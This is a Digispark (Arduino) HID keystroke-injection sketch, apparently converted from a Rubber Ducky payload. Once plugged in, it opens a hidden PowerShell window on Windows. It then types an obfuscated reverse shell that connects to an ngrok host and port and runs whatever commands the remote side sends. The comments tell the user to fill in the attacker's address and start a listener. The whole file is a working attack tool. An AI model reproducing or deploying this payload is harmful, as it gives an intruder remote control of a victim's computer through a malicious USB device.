// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  //       ReverseDucky2
  //       Version 1.1
  //       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
  //       Author: 0iphor13
  
  //       Reverse shell executed in the background
  //       Fill in Attacker-IP and Port in Line 19
  //       DON'T FORGET TO START LISTENER
  
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -NoP -NonI -W hidden");
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(200);
  DigiKeyboard.print("$c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("0.tcp.ngrok.io",17249);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("t-STriNG);$x=$z+\"RD \"+(pwd)+\"#\";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}
